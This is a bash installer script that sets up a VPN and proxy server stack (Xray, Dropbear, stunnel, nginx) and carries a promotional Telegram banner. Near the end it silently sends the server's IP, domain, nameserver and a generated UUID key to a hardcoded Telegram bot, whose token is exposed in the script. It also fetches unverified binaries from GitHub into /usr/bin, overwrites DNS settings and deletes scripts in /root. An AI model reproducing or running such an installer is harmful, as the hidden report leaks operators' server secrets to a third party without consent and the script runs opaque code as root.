#!/bin/bash
# -------------------------------------------------------------------------------------------------
# |══════════════════════════════════════════════════════════════════════════════════════════════════════════════|
# |• Autoscript AIO Lite Menu By cyber Project |
# |• cyber Project Developer @Nethead001 | @Nethead001 | https://t.me/WORLDWILDINTERNETTECH |
# |• Copyright 2024 18 cyber Decode [ ] | [ @Nethead001 ] | [ Jamaica ] |
# |══════════════════════════════════════════════════════════════════════════════════════════════════════════════|
# -------------------------------------------------------------------------------------------------

# Link placeholder
# link="https://raw.githubusercontent.com/NETHEAD001-vpsscript/Nethead001/main/install.sh"

# Clear screen
clear

# Configure SSH ports
# echo "Port 22 Port 3303 #Port 53" >> /etc/ssh/sshd_config

# Restart SSH service
# systemctl stop systemd-resolved
# systemctl restart ssh
# systemctl restart sshd
# systemctl start systemd-resolved

# Clear screen
clear

# Check if curl exists and set DNS to Cloudflare if not set
[[ -e "$(which curl)" ]] && {
  if [[ -z "$(cat /etc/resolv.conf | grep "1.1.1.1")" ]]; then
    echo "nameserver 1.1.1.1" > /etc/resolv.conf
  fi
}
clear

# Create directories
mkdir -p /etc/slowdns /etc/xray /etc/funny /var /var/lib /var/log /var/log/xray
touch /var/log/xray/access.log
chmod +x /var/log/xray/*

# Prompt for domain
read -rp "Enter Sub Domain: " domain

# Optional: other variables like nsdomain, api, id
# read -p "Nameserver: " nsdomain
# read -p "Api Bot Token: " api
# read -p "Admin ID Telegram: " id

# Save domain to file
echo "$domain" > /etc/xray/domain

# Generate UUID
uuid=$(cat /proc/sys/kernel/random/uuid)
echo "$uuid" > /etc/xray/.key
chmod +x /etc/xray/.key
api773=$(cat /etc/xray/.key)

# Optional: Prompt for Email
# read -rp "Masukkan Email anda: " email

# Update package list
apt-get update

# Remove unused modules
apt-get -y --purge remove samba* apache2* sendmail* bind9*
apt remove apache2 -y
apt autoremove -y

# Install dependencies
apt-get install -y libio-socket-inet6-perl libsocket6-perl libcrypt-ssleay-perl libnet-libidn-perl perl libio-socket-ssl-perl libwww-perl libpcre3 libpcre3-dev zlib1g-dev dbus iftop zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr dnsutils sudo at htop iptables bsdmainutils cron lsof lnav

# Install additional tools
apt install -y binutils socat lolcat ruby ruby-dev figlet zip jq certbot python2 python3 screen haproxy at

# Get info
curl ipinfo.io/org > /root/.isp
curl ipinfo.io/city > /root/.city
curl ipinfo.io/region > /root/.region

# Install Dropbear
apt install -y dropbear
rm /etc/default/dropbear
cat > /etc/default/dropbear <<EOF
NO_START=0
DROPBEAR_PORT=111
DROPBEAR_EXTRA_ARGS="-p 109 -p 69"
DROPBEAR_BANNER="/etc/issue.net"
EOF

# Configure banner
cat > /etc/issue.net <<EOF
<p style="text-align:center"><b> 
<br><font color="#00FFE2"><br>┏━━━━━━━━━━━━━━━┓<br> DDK Tricks<br>┗━━━━━━━━━━━━━━━┛<br></font><br>
<font color="#00FF00"><p style="text-align:center"><b> <br><font color="#00FFE2">क═══════क⊹⊱✫⊰⊹क═══════क<b></font></p>
T̺͆O̺͆ M̺͆Y̺͆ S̺͆E̺͆R̺͆V̺͆ER̺͆ V͇̿I͇̿P͇̿ ] ★
</b></font><br><font color="#FFF00">DDK Tricks</font><br>
<font color="#FF00FF">❖Ƭʜᴇ No DDOS</font><br>
<font color="#FF0000">❖get unlimited eSIM</font><br>
<font color="#FFB1C2">❖all method </font><b <font color="#00FF00">❖free esim</font></b><br>
<font color="#00FF00">➳ᴹᴿ᭄ Nethead001 Free net : https://t.me/WORLDWILDINTERNETTECH </font><br>
<font color="#00FFE2">क═══════क⊹⊱✫⊰⊹क═══════क</font><br></p>
</b></font>
EOF

# Configure Dropbear systemd service
cat > /etc/systemd/system/dropbear.service <<EOF
[Unit]
Description=Dropbear SSH server
After=network.target

[Service]
ExecStart=/usr/sbin/dropbear -F -P /var/run/dropbear.pid -E
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable dropbear
systemctl restart dropbear
killall dropbear
clear

# Install Xray
cd /etc/xray
wget -q -O config.json "https://raw.githubusercontent.com/Nethead001PutriFN/sslh/main/config.json"
# wget -q -O http.json "https://raw.githubusercontent.com/Nethead001PutriFN/sslh/main/http.json"
# wget -q -O split.json "https://raw.githubusercontent.com/Nethead001PutriFN/sslh/main/split.json"
chmod +x /etc/xray/*
# Other
cd /usr/bin
wget -q -O m.zip "https://raw.githubusercontent.com/Nethead001PutriFN/menu/main/.1.13.zip"
yes A | unzip m.zip
rm -fr m.zip
chmod +x *
cd /usr/bin/rere
chmod +x *
cd

# Fix Apache2
systemctl daemon-reload
systemctl stop apache2
systemctl disable apache2

# Set up stunnel
apt install stunnel4 -y
cat > /etc/stunnel/stunnel.conf <<-EOF
cert = /etc/xray/funny.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1

[openssh]
accept = 777
connect = 127.0.0.1:3303

[dropbear]
accept = 447
connect = 127.0.0.1:109

[openvpn]
accept = 444
connect = 127.0.0.1:1194
EOF

# Set timezone GMT+7
timedatectl set-timezone Asia/Jakarta

# Install latest Xray
cd /usr/bin
wget -q https://raw.githubusercontent.com/Nethead001PutriFN/Nethead001PutriFN/main/api/xray.zip
yes A | unzip xray.zip
rm -fr xray.zip
chmod +x *.dat
chmod +x xray
cd

# Profile setup
apt install neofetch -y
cat > /root/.profile << EOF
if [ "\$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
clear
#neofetch --ascii_distro Arcolinux_small info
EOF
chmod 644 /root/.profile

# Crontab entries
echo "0 0,6,12,18 * * * root backup
0,15,30,45 * * * * root /usr/bin/xp
*/5 * * * * root limit-ip
*/30 * * * * root clear-log
*/5 * * * * root kill-quota" >> /etc/crontab
systemctl restart cron

# Install vnStat
apt install vnstat -y

# Install Cloudflare Argo
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
rm -fr cloudflared-linux-amd64.deb

# Install Node.js
apt install nodejs -y

# Install Speedtest
# curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | sudo bash
# sudo apt-get install speedtest -y

# Install nginx
apt install nginx -y
rm /etc/nginx/conf.d/default.conf
cd /etc/nginx
rm -fr nginx.conf
wget -q -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/Nethead001PutriFN/sslh/main/nginx.conf"
cd

# Company info
country="PK"
state="Sindh"
locality="Kab. Kota Waringin Timur"
organization="Cyber Project"
organizationalunit="99999"
commonname="Cyber"
email="mrshahnawazyt5@gmaul.com"

# Remove default nginx and haproxy
systemctl stop nginx
haproxy -d
rm -fr /etc/xray/xray*
rm -fr /etc/xray/funny.pem

# Generate SSL certificate
openssl genrsa -out /etc/xray/xray.key 2048
openssl req -new -x509 -key /etc/xray/xray.key -out /etc/xray/xray.crt -days 1095 \
  -subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email"
cat /etc/xray/xray.key /etc/xray/xray.crt >> /etc/xray/funny.pem
chmod 644 /etc/xray/*
systemctl restart nginx haproxy

# Install socat and firewall rules
apt install iptables -y
apt install curl socat xz-utils wget -y
apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y
apt install socat cron bash-completion -y
# Firewall UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https
sudo ufw allow 80/tcp
sudo ufw allow 8880/tcp
sudo ufw allow 443/tcp
sudo ufw allow 1194/tcp
sudo ufw allow 447/tcp
sudo ufw allow 444/tcp
sudo ufw allow 777/tcp
sudo ufw allow 2080/tcp
sudo ufw allow 2082/tcp
sudo ufw allow 2200/udp
sudo ufw allow 5300/udp
sudo ufw allow 8000/tcp
sudo ufw allow 9443/tcp
sudo ufw allow 8443/tcp
sudo ufw allow 1080/tcp
echo "yes" | sudo ufw enable

# Configure iptables
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 8880 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 1194 -j ACCEPT
iptables -A INPUT -p tcp --dport 447 -j ACCEPT
iptables -A INPUT -p tcp --dport 444 -j ACCEPT
iptables -A INPUT -p tcp --dport 777 -j ACCEPT
iptables -A INPUT -p tcp --dport 2080 -j ACCEPT
iptables -A INPUT -p tcp --dport 2082 -j ACCEPT
iptables -A INPUT -p udp --dport 2200 -j ACCEPT
iptables -A INPUT -p udp --dport 5300 -j ACCEPT
iptables -A INPUT -p tcp --dport 8000 -j ACCEPT
iptables -A INPUT -p tcp --dport 9443 -j ACCEPT
iptables -A INPUT -p tcp --dport 8443 -j ACCEPT
iptables -A INPUT -p tcp --dport 1080 -j ACCEPT

# Restart services
systemctl restart proxy
systemctl restart edu
systemctl restart server
systemctl restart badvpn
systemctl restart xray
systemctl restart sslh
systemctl restart haproxy
systemctl restart cron
systemctl restart dnstt
systemctl restart quota
systemctl restart http
systemctl restart trojan-go

# Final cleanup
apt autoremove -y
apt clean
cd
rm /root/*.sh
rm -fr /root/*.py
nsdomain=$(cat /etc/slowdns/nsdomain)
systemctl restart nginx
systemctl restart ufw

# Telegram notification
OUTPUT=" DETAIL INSTALL SCRIPT 1.13 ========================= IP: $(curl ifconfig.me) Domain: $domain Namserver: $nsdomain WebAPI: $api773 ========================= @fn_project Autoscript "
CHATID="6389176425"
KEY="6981433170:AAFhh3UQi2H_lsJiAjGEMoj4xad2TdNHQfI"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
curl -s --max-time $TIME --data-urlencode "chat_id=$CHATID" --data-urlencode "text=$OUTPUT" $URL >/dev/null 2>&1

# Show success message
clear
echo ""
echo -e "\033[96m_______________________________\033[0m"
echo -e "\033[92m INSTALL SUCCESS\033[0m"
echo -e "\033[96m_______________________________\033[0m"
sleep 1.5
